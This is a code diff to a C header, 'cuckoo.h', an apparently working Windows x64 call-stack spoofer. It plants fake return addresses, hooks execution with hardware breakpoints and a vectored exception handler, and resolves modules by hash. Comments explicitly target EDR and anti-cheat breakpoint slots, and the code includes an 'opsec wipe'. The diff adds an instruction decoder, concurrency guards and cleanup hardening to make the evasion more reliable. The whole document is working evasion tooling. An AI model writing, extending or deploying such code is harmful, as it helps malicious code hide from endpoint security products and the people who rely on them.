@@ -1,17 +1,11 @@
-/*
- * cuckoo.h -- v3.2 RA spoofer (VEH + HW BP).
- *
- * Plants chain on cu_dispatch's local alloc, arms a free DR slot at
- * BTITN+0x14, jmps target. Target's ret to BTITN+0x14 fires #DB; cu_veh
- * pivots back. Mid-call chain: target -> BTITN+0x14 -> RtlUTS+0x21 -> 0.
- *
- * nargs in [0..5]. Arg 6's stack slot collides with BTITN's parent-RA
- * slot (btitn_prolog=0x28 puts both at planted_top+0x30).
+/* cuckoo.h - v3.2 x64 call-stack spoofer (VEH + hardware breakpoint).
  *
  *   cuckoo_init();
- *   cuckoo_call(fn, nargs, ...);
+ *   cuckoo_call(fn, nargs, ...);    nargs 0..5; arg6 collides with SlotB
  *   cuckoo_clear();
  *   cuckoo_selftest();
+ *
+ * Target exceptions bypass the real chain; only a VEH sees them.
  */
 
 #ifndef CUCKOO_H_INCLUDED
@@ -49,8 +43,8 @@ int   cuckoo_selftest(void);
 #define CUCKOO_NO_OPSEC_WIPE         0
 #endif
 
-/* slot_a 0x18 -> planted_top ≡ 8 mod 16 (Win64 ABI for jmp entry).
- * slot_c must fit in cu_dispatch's 0x108 alloc. */
+/* slot_a 0x18: planted_top = RSP+0x18, so RSP%16 == 8 at jmp.
+ * slot_c must fit cu_dispatch's 0x108 alloc. */
 #define CUCKOO_SLOT_A_OFFSET         0x18
 #define CUCKOO_SLOT_C_CAP            0x100
 
@@ -73,7 +67,6 @@ extern "C" {
 #  define CU_LOG(...) do {} while(0)
 #endif
 
-/* PEB / LDR layouts. */
 typedef struct _CU_UNICODE_STRING {
     USHORT Length, MaximumLength;
     PWSTR  Buffer;
@@ -106,29 +99,29 @@ typedef struct _CU_PEB_MIN {
     CU_PEB_LDR_DATA* Ldr;
 } CU_PEB_MIN;
 
-/* CU_SPOOFER offsets are load-bearing; keep in sync with CU_* EQUs in asm. */
+/* Keep in sync with CU_* EQUs in the asm. */
 typedef struct _CU_SPOOFER {
     PVOID  SpoofFunctionPointer;   /* 0x00 */
-    PVOID  FakeParentL1;           /* 0x08 -- BTITN+0x14 (target's pseudo-RA) */
-    PVOID  FakeParentL2;           /* 0x10 -- RtlUTS+0x21 */
+    PVOID  FakeParentL1;           /* 0x08 */
+    PVOID  FakeParentL2;           /* 0x10 */
     UINT64 Nargs;                  /* 0x18 */
     PVOID  Arg01;                  /* 0x20 */
     PVOID  Arg02;                  /* 0x28 */
     PVOID  Arg03;                  /* 0x30 */
     PVOID  Arg04;                  /* 0x38 */
-    PVOID  Arg05;                  /* 0x40 -- stack arg @ planted_top+0x28 */
-    UINT64 SlotA;                  /* 0x48 -- body offset where FakeL1 plants */
-    UINT64 SlotB;                  /* 0x50 -- body offset where FakeL2 plants */
-    UINT64 SlotC;                  /* 0x58 -- body offset where terminator plants */
-    UINT64 SavedRsp;               /* 0x60 -- written by cu_dispatch */
-    UINT64 ReturnValue;            /* 0x68 -- written by cu_veh */
-    UINT64 DrSlot;                 /* 0x70 -- DR slot (0..3) chosen by cu_arm_hwbp */
+    PVOID  Arg05;                  /* 0x40 */
+    UINT64 SlotA;                  /* 0x48 */
+    UINT64 SlotB;                  /* 0x50 */
+    UINT64 SlotC;                  /* 0x58 */
+    UINT64 SavedRsp;               /* 0x60 */
+    UINT64 ReturnValue;            /* 0x68 */
+    UINT64 DrSlot;                 /* 0x70 */
 } CU_SPOOFER;
 
 extern void cu_dispatch(CU_SPOOFER* s);
 extern void cu_dispatch_continuation(void);
 
-/* --- Module / symbol resolution --------------------------------------- */
+/* Module and symbol resolution. */
 
 #define CU_FH_RND_SEED  0xDC072B8Au
 #define CU_ROR8(v)      ((DWORD)((v) >> 8) | (DWORD)((v) << 24))
@@ -218,7 +211,7 @@ static void cu_zero(void* p, size_t n) {
     while (n--) *q++ = 0;
 }
 
-/* --- Unwind metadata probes ------------------------------------------ */
+/* Unwind metadata probes. */
 
 static int cu_read_size_of_prolog(DWORD64 fn_addr, UCHAR* out_size) {
     DWORD64 image_base = 0;
@@ -251,7 +244,7 @@ static int cu_get_unwind_delta(DWORD64 fn_addr, DWORD* out_delta) {
     return 0;
 }
 
-/* --- L1/L2 offset selection ------------------------------------------ */
+/* Call-site selection. */
 
 static DWORD cu_find_post_call_offset(const BYTE* buf, DWORD size) {
     for (DWORD i = 0; i + 2 <= size; i++) {
@@ -270,7 +263,197 @@ static DWORD cu_find_post_call_offset(const BYTE* buf, DWORD size) {
     return 0;
 }
 
-/* Authoritative L2 picker: walk our own stack with RtlVirtualUnwind. */
+/* The byte scan can match opcodes inside immediates. Decode lengths from the
+ * function start; 0 with *complete=0 means unsupported (fall back). */
+
+static int cu_is_prefix(BYTE b) {
+    switch (b) {
+    case 0x26: case 0x2E: case 0x36: case 0x3E:
+    case 0x64: case 0x65: case 0x66: case 0x67:
+    case 0xF0: case 0xF2: case 0xF3:
+        return 1;
+    default:
+        return 0;
+    }
+}
+
+/* p = ModRM index; extra = bytes after it (SIB + displacement). */
+static int cu_modrm_len(const BYTE* fn, DWORD n, DWORD p, DWORD* extra, BYTE* modrm) {
+    BYTE m, sib;
+    DWORD e = 0;
+    int mod, rm;
+
+    if (p >= n) return 0;
+    m = fn[p];
+    *modrm = m;
+    mod = m >> 6;
+    rm = m & 7;
+    if (mod != 3) {
+        if (rm == 4) {
+            if (p + 1 >= n) return 0;
+            sib = fn[p + 1];
+            e = 1;
+            if (mod == 0) {
+                if ((sib & 7) == 5) e += 4;
+            } else if (mod == 1) {
+                e += 1;
+            } else {
+                e += 4;
+            }
+        } else if (mod == 0) {
+            if (rm == 5) e = 4;         /* RIP-relative disp32 */
+        } else if (mod == 1) {
+            e = 1;
+        } else {
+            e = 4;
+        }
+    }
+    *extra = e;
+    return 1;
+}
+
+/* Offset past the first near call ending after prolog. >0: found.
+ * 0 + *complete=1: no call. 0 + *complete=0: unsupported (use byte scan). */
+static DWORD cu_decode_post_call_offset(const BYTE* fn, DWORD n, DWORD prolog, int* complete) {
+    DWORD i = 0;
+    *complete = 0;
+
+    while (i < n) {
+        DWORD start = i, p = i, extra = 0, imm = 0, end;
+        BYTE op, modrm = 0;
+        int rex_w = 0, opsz = 0, addrsz = 0;
+        int map = 0, has_modrm = 0, is_call = 0, group3 = 0;
+
+        for (;;) {
+            BYTE b;
+            if (p >= n) return 0;
+            b = fn[p];
+            if (b == 0x66) { opsz = 1; p++; continue; }
+            if (b == 0x67) { addrsz = 1; p++; continue; }
+            if (b >= 0x40 && b <= 0x4F) { rex_w = (b & 0x08) != 0; p++; continue; }
+            if (cu_is_prefix(b)) { p++; continue; }
+            break;
+        }
+        if (p - start > 14 || p >= n) return 0;
+
+        op = fn[p++];
+        if (op == 0x0F) {
+            if (p >= n) return 0;
+            op = fn[p++];
+            if (op == 0x38) {
+                map = 2;
+                if (p >= n) return 0;
+                op = fn[p++];
+            } else if (op == 0x3A) {
+                map = 3;
+                if (p >= n) return 0;
+                op = fn[p++];
+            } else {
+                map = 1;
+            }
+        } else if (op == 0xC4 || op == 0xC5 || op == 0x62) {
+            return 0;                       /* VEX / EVEX */
+        }
+
+        if (map == 0) {
+            if (op == 0x06 || op == 0x07 || op == 0x0E || op == 0x16 ||
+                op == 0x17 || op == 0x1E || op == 0x1F || op == 0x27 ||
+                op == 0x2F || op == 0x37 || op == 0x3F || op == 0x60 ||
+                op == 0x61 || op == 0x82 || op == 0x9A || op == 0xCE ||
+                op == 0xD4 || op == 0xD5 || op == 0xD6 || op == 0xEA)
+                return 0;                   /* invalid in 64-bit */
+            if ((op >= 0x50 && op <= 0x5F) || (op >= 0x90 && op <= 0x9F) ||
+                (op >= 0xA4 && op <= 0xA7) || (op >= 0xAA && op <= 0xAF) ||
+                (op >= 0x6C && op <= 0x6F) ||
+                op == 0xC3 || op == 0xC9 || op == 0xCB || op == 0xCC ||
+                op == 0xCF || op == 0xD7 || (op >= 0xEC && op <= 0xEF) ||
+                op == 0xF1 || op == 0xF4 || op == 0xF5 ||
+                (op >= 0xF8 && op <= 0xFD)) {
+                /* no ModRM/imm */
+            } else if (op == 0x04 || op == 0x0C || op == 0x14 || op == 0x1C ||
+                       op == 0x24 || op == 0x2C || op == 0x34 || op == 0x3C ||
+                       op == 0x6A || op == 0xA8 || (op >= 0xB0 && op <= 0xB7) ||
+                       op == 0xCD || (op >= 0xE4 && op <= 0xE7)) {
+                imm = 1;
+            } else if (op == 0x05 || op == 0x0D || op == 0x15 || op == 0x1D ||
+                       op == 0x25 || op == 0x2D || op == 0x35 || op == 0x3D ||
+                       op == 0x68 || op == 0xA9) {
+                imm = opsz ? 2 : 4;
+            } else if (op >= 0xB8 && op <= 0xBF) {
+                imm = rex_w ? 8 : (opsz ? 2 : 4);
+            } else if (op >= 0x70 && op <= 0x7F) {
+                imm = 1;
+            } else if ((op >= 0xE0 && op <= 0xE3) || op == 0xEB) {
+                imm = 1;
+            } else if (op == 0xE8) {
+                imm = 4; is_call = 1;
+            } else if (op == 0xE9) {
+                imm = 4;
+            } else if (op == 0xA0 || op == 0xA1 || op == 0xA2 || op == 0xA3) {
+                imm = addrsz ? 4 : 8;
+            } else if (op == 0xC2 || op == 0xCA) {
+                imm = 2;
+            } else if (op == 0xC8) {
+                imm = 3;
+            } else if (op == 0x80 || op == 0x83 || op == 0x6B ||
+                       op == 0xC0 || op == 0xC1 || op == 0xC6) {
+                has_modrm = 1; imm = 1;
+            } else if (op == 0x81 || op == 0x69 || op == 0xC7) {
+                has_modrm = 1; imm = opsz ? 2 : 4;
+            } else if (op == 0xF6 || op == 0xF7) {
+                has_modrm = 1; group3 = 1;
+            } else {
+                has_modrm = 1;
+            }
+        } else if (map == 1) {
+            if (op == 0x0F) return 0;       /* 3DNow! */
+            if (op == 0x05 || op == 0x06 || op == 0x07 || op == 0x08 ||
+                op == 0x09 || op == 0x0B || op == 0x0E ||
+                (op >= 0x30 && op <= 0x35) || op == 0x37 || op == 0x77 ||
+                op == 0xA0 || op == 0xA1 || op == 0xA2 || op == 0xA8 ||
+                op == 0xA9 || op == 0xAA || (op >= 0xC8 && op <= 0xCF)) {
+                /* no ModRM/imm */
+            } else if (op >= 0x80 && op <= 0x8F) {
+                imm = 4;
+            } else if (op == 0x70 || op == 0x71 || op == 0x72 || op == 0x73 ||
+                       op == 0xA4 || op == 0xAC || op == 0xBA || op == 0xC2 ||
+                       op == 0xC4 || op == 0xC5 || op == 0xC6) {
+                has_modrm = 1; imm = 1;
+            } else {
+                has_modrm = 1;
+            }
+        } else if (map == 2) {
+            has_modrm = 1;
+        } else {
+            has_modrm = 1; imm = 1;         /* 0F 3A */
+        }
+
+        if (has_modrm) {
+            if (!cu_modrm_len(fn, n, p, &extra, &modrm)) return 0;
+            if (group3) {
+                int reg = (modrm >> 3) & 7;
+                if (reg <= 1) imm = (op == 0xF6) ? 1 : (opsz ? 2 : 4);
+            }
+            if (map == 0 && op == 0xFF && ((modrm >> 3) & 7) == 2)
+                is_call = 1;                /* near call */
+            end = p + 1 + extra + imm;
+        } else {
+            end = p + imm;
+        }
+
+        if (end > n || end <= start || end - start > 15) return 0;
+        if (is_call && end > prolog) {
+            *complete = 1;
+            return end;
+        }
+        i = end;
+    }
+
+    *complete = 1;
+    return 0;
+}
+
+/* L2 picker: unwind our own stack. */
 static DWORD cu_discover_btitn_return_offset(DWORD64 btitn_addr, DWORD64 rtlu_addr) {
     DWORD64 b_ib = 0, r_ib = 0;
     PRUNTIME_FUNCTION b_rf = RtlLookupFunctionEntry(btitn_addr, &b_ib, NULL);
@@ -314,32 +497,58 @@ static DWORD cu_pick_post_call_or_fallback(DWORD64 fn_addr, UCHAR size_of_prolog
     DWORD fn_size = rf->EndAddress - rf->BeginAddress;
     if (fn_size <= size_of_prolog) return (DWORD)size_of_prolog + 1;
     DWORD body = size_of_prolog;
-    DWORD post = cu_find_post_call_offset(
-        (const BYTE*)fn_addr + body, fn_size - body);
-    if (post == 0) return (DWORD)size_of_prolog + 1;
-    DWORD abs_off = body + post;
-    if (abs_off >= fn_size) return (DWORD)size_of_prolog + 1;
+    int complete = 0;
+    DWORD abs_off = cu_decode_post_call_offset(
+        (const BYTE*)fn_addr, fn_size, body, &complete);
+    if (abs_off == 0 && !complete) {
+        DWORD post;
+        CU_LOG("call-site decode failed; using byte scan\n");
+        post = cu_find_post_call_offset(
+            (const BYTE*)fn_addr + body, fn_size - body);
+        if (post) abs_off = body + post;
+    }
+    if (abs_off == 0 || abs_off >= fn_size)
+        return (DWORD)size_of_prolog + 1;
     return abs_off;
 }
 
-/* --- Process-global state -------------------------------------------- */
+/* Global state. */
 
-static PVOID         g_cu_fake_parent_l1 = 0;   /* BTITN+0x14 */
-static PVOID         g_cu_fake_parent_l2 = 0;   /* RtlUTS+0x21 */
-static UINT64        g_cu_slot_a         = 0;   /* body offset where FakeL1 plants */
-static UINT64        g_cu_slot_b         = 0;   /* body offset where FakeL2 plants */
-static UINT64        g_cu_slot_c         = 0;   /* body offset where 0 terminator plants */
+static PVOID         g_cu_fake_parent_l1 = 0;
+static PVOID         g_cu_fake_parent_l2 = 0;
+static UINT64        g_cu_slot_a         = 0;
+static UINT64        g_cu_slot_b         = 0;
+static UINT64        g_cu_slot_c         = 0;
 static DWORD         g_cu_tls_index      = TLS_OUT_OF_INDEXES;
 static PVOID         g_cu_veh_handle     = NULL;
 
 /* 0=uninit  1=in-progress  2=ready. */
 static volatile LONG g_cu_init_state = 0;
 
-/* --- VEH + HW-BP arming ---------------------------------------------- */
+/* Live API calls; clear() drains these before teardown. */
+static volatile LONG g_cu_active  = 0;
+static volatile LONG g_cu_closing = 0;
 
-/* Picks lowest free DR slot to avoid clobbering EDR/anti-cheat HWBPs. */
+static int cu_acquire(void) {
+    InterlockedIncrement(&g_cu_active);
+    if (InterlockedCompareExchange(&g_cu_closing, 0, 0) != 0) {
+        InterlockedDecrement(&g_cu_active);
+        return 1;
+    }
+    return 0;
+}
+
+static void cu_release(void) { InterlockedDecrement(&g_cu_active); }
+
+/* VEH and hardware-breakpoint arming. */
+
+/* Lowest free DR slot; avoids EDR/anti-cheat slots. */
 int cu_arm_hwbp(CU_SPOOFER* s) {
-    if (!TlsSetValue(g_cu_tls_index, s)) return 1;
+    /* TLS is non-NULL only while a call is armed on this thread. */
+    DWORD last_error = GetLastError();
+    PVOID held = (g_cu_tls_index != TLS_OUT_OF_INDEXES) ? TlsGetValue(g_cu_tls_index) : NULL;
+    SetLastError(last_error);
+    if (held) return 5;
 
     CONTEXT ctx;
     cu_zero(&ctx, sizeof(ctx));
@@ -352,6 +561,8 @@ int cu_arm_hwbp(CU_SPOOFER* s) {
     }
     if (slot < 0) return 4;
 
+    if (!TlsSetValue(g_cu_tls_index, s)) return 1;
+
     DWORD64* drs[4] = { &ctx.Dr0, &ctx.Dr1, &ctx.Dr2, &ctx.Dr3 };
     *drs[slot] = (DWORD64)s->FakeParentL1;
 
@@ -361,25 +572,35 @@ int cu_arm_hwbp(CU_SPOOFER* s) {
     ctx.Dr7 |= (1ULL << (2 * slot));
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 
-    if (!SetThreadContext(GetCurrentThread(), &ctx)) return 3;
+    if (!SetThreadContext(GetCurrentThread(), &ctx)) {
+        TlsSetValue(g_cu_tls_index, NULL);
+        return 3;
+    }
 
     s->DrSlot = (UINT64)slot;
     return 0;
 }
 
-/* Catches #DB at BTITN+0x14, pivots back to cu_dispatch_continuation. */
+/* Catch #DB at L1; pivot to cu_dispatch_continuation. */
 LONG WINAPI cu_veh(PEXCEPTION_POINTERS ep) {
     if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
         return EXCEPTION_CONTINUE_SEARCH;
     if ((UINT64)ep->ExceptionRecord->ExceptionAddress != (UINT64)g_cu_fake_parent_l1)
         return EXCEPTION_CONTINUE_SEARCH;
 
+    /* TlsGetValue clears LastError; preserve the target's value. */
+    DWORD last_error = GetLastError();
     CU_SPOOFER* s = (CU_SPOOFER*)TlsGetValue(g_cu_tls_index);
+    SetLastError(last_error);
     if (!s || s->DrSlot >= 4) return EXCEPTION_CONTINUE_SEARCH;
 
     /* Confirm hit was on our slot, not EDR's. */
     if (!(ep->ContextRecord->Dr6 & (1ULL << s->DrSlot)))
         return EXCEPTION_CONTINUE_SEARCH;
+
+    /* Release this thread's owner; nested-call guard. */
+    TlsSetValue(g_cu_tls_index, NULL);
+    SetLastError(last_error);
 
     s->ReturnValue = (UINT64)ep->ContextRecord->Rax;
 
@@ -398,7 +619,7 @@ LONG WINAPI cu_veh(PEXCEPTION_POINTERS ep) {
     return EXCEPTION_CONTINUE_EXECUTION;
 }
 
-/* --- Init / clear / call --------------------------------------------- */
+/* Init, clear, call. */
 
 static int cu_init_internal(void) {
     if (g_cu_init_state == 2) return 0;
@@ -410,6 +631,7 @@ static int cu_init_internal(void) {
     }
 
     int err = 1;
+    __try {
     do {
         HMODULE k32   = cu_get_module_by_hash(CUCKOO_KERNEL32_HASH);
         HMODULE ntdll = cu_get_module_by_hash(CUCKOO_NTDLL_HASH);
@@ -435,7 +657,14 @@ static int cu_init_internal(void) {
         DWORD btitn_prolog_total = btitn_delta - 8;
         DWORD rtlu_prolog_total  = rtlu_delta  - 8;
 
-        /* Slots relative to body_rsp. slot_b/c follow each frame's prolog. */
+        /* SlotB must clear the target's shadow space and the arg5 slot. */
+        if (btitn_prolog_total < 0x28) {
+            CU_LOG("BTITN frame too small (0x%lx); SlotB would collide\n",
+                   (unsigned long)btitn_prolog_total);
+            break;
+        }
+
+        /* Slots relative to body_rsp; b/c follow each frame's prolog. */
         UINT64 slot_a = (UINT64)CUCKOO_SLOT_A_OFFSET;
         UINT64 slot_b = slot_a + 8 + btitn_prolog_total;
         UINT64 slot_c = slot_b + 8 + rtlu_prolog_total;
@@ -479,31 +708,54 @@ static int cu_init_internal(void) {
                (unsigned long long)slot_c, (unsigned long)g_cu_tls_index);
         err = 0;
     } while (0);
-
-    if (err) {
-        if (g_cu_veh_handle) {
-            RemoveVectoredExceptionHandler(g_cu_veh_handle);
-            g_cu_veh_handle = NULL;
-        }
-        if (g_cu_tls_index != TLS_OUT_OF_INDEXES) {
-            TlsFree(g_cu_tls_index);
-            g_cu_tls_index = TLS_OUT_OF_INDEXES;
-        }
-        g_cu_fake_parent_l1 = 0;
-        g_cu_fake_parent_l2 = 0;
-        g_cu_slot_a = 0;
-        g_cu_slot_b = 0;
-        g_cu_slot_c = 0;
-        InterlockedExchange(&g_cu_init_state, 0);
-        return 1;
     }
+    __finally {
+        /* Runs on unwind too; prevents a stuck init state. */
+        if (err) {
+            if (g_cu_veh_handle) {
+                RemoveVectoredExceptionHandler(g_cu_veh_handle);
+                g_cu_veh_handle = NULL;
+            }
+            if (g_cu_tls_index != TLS_OUT_OF_INDEXES) {
+                TlsFree(g_cu_tls_index);
+                g_cu_tls_index = TLS_OUT_OF_INDEXES;
+            }
+            g_cu_fake_parent_l1 = 0;
+            g_cu_fake_parent_l2 = 0;
+            g_cu_slot_a = 0;
+            g_cu_slot_b = 0;
+            g_cu_slot_c = 0;
+            InterlockedExchange(&g_cu_init_state, 0);
+        }
+    }
+
+    if (err) return 1;
     InterlockedExchange(&g_cu_init_state, 2);
     return 0;
 }
 
-int cuckoo_init(void) { return cu_init_internal(); }
+int cuckoo_init(void) {
+    int r;
+    if (cu_acquire()) return 1;
+    __try { r = cu_init_internal(); }
+    __finally { cu_release(); }
+    return r;
+}
 
 void cuckoo_clear(void) {
+    /* No-op inside a spoofed call on this thread; its VEH is needed. */
+    if (g_cu_tls_index != TLS_OUT_OF_INDEXES) {
+        DWORD last_error = GetLastError();
+        PVOID held = TlsGetValue(g_cu_tls_index);
+        SetLastError(last_error);
+        if (held) return;
+    }
+    if (InterlockedCompareExchange(&g_cu_closing, 0, 0) != 0) return;
+    if (InterlockedExchange(&g_cu_closing, 1) != 0) return;
+
+    /* Drain in-flight calls; new calls fail while closing. */
+    while (InterlockedCompareExchange(&g_cu_active, 0, 0) != 0) Sleep(1);
+
     if (g_cu_veh_handle) {
         RemoveVectoredExceptionHandler(g_cu_veh_handle);
         g_cu_veh_handle = NULL;
@@ -518,30 +770,45 @@ void cuckoo_clear(void) {
     g_cu_slot_a = 0;
     g_cu_slot_b = 0;
     g_cu_slot_c = 0;
+
+    InterlockedExchange(&g_cu_closing, 0);
 }
 
 void* cuckoo_call(void* fn, size_t nargs, ...) {
-    if (nargs > 5) return NULL;
-    if (cu_init_internal() != 0) return NULL;
-
     CU_SPOOFER s;
+    void* ret = NULL;
+    int ok = 0;
+
+    if (!fn || nargs > 5) return NULL;
+    if (cu_acquire()) return NULL;
+
     cu_zero(&s, sizeof(s));
-    s.SpoofFunctionPointer = fn;
-    s.FakeParentL1         = g_cu_fake_parent_l1;
-    s.FakeParentL2         = g_cu_fake_parent_l2;
-    s.Nargs                = (UINT64)nargs;
-    s.SlotA                = g_cu_slot_a;
-    s.SlotB                = g_cu_slot_b;
-    s.SlotC                = g_cu_slot_c;
+    __try {
+        if (cu_init_internal() == 0) {
+            s.SpoofFunctionPointer = fn;
+            s.FakeParentL1         = g_cu_fake_parent_l1;
+            s.FakeParentL2         = g_cu_fake_parent_l2;
+            s.Nargs                = (UINT64)nargs;
+            s.SlotA                = g_cu_slot_a;
+            s.SlotB                = g_cu_slot_b;
+            s.SlotC                = g_cu_slot_c;
 
-    PVOID* arg_slots[5] = { &s.Arg01, &s.Arg02, &s.Arg03, &s.Arg04, &s.Arg05 };
-    va_list ap;
-    va_start(ap, nargs);
-    for (size_t i = 0; i < nargs; i++) *arg_slots[i] = va_arg(ap, PVOID);
-    va_end(ap);
+            PVOID* arg_slots[5] = { &s.Arg01, &s.Arg02, &s.Arg03, &s.Arg04, &s.Arg05 };
+            va_list ap;
+            va_start(ap, nargs);
+            for (size_t i = 0; i < nargs; i++) *arg_slots[i] = va_arg(ap, PVOID);
+            va_end(ap);
 
-    cu_dispatch(&s);
-    void* ret = (void*)(uintptr_t)s.ReturnValue;
+            cu_dispatch(&s);
+            ret = (void*)(uintptr_t)s.ReturnValue;
+            ok = 1;
+        }
+    }
+    __finally {
+        cu_release();
+    }
+
+    if (!ok) return NULL;
 
 #if !CUCKOO_NO_OPSEC_WIPE
     cu_zero(&s, sizeof(s));
@@ -550,7 +817,7 @@ void* cuckoo_call(void* fn, size_t nargs, ...) {
 }
 
 int cuckoo_selftest(void) {
-    if (cu_init_internal() != 0) { CU_LOG("selftest: init failed\n"); return 1; }
+    if (cuckoo_init() != 0) { CU_LOG("selftest: init failed\n"); return 1; }
     HMODULE k32 = cu_get_module_by_hash(CUCKOO_KERNEL32_HASH);
     if (!k32) { CU_LOG("selftest: no kernel32\n"); return 2; }
     UINT64 fn = cu_get_symbol_address(k32, "GetCurrentProcessId");
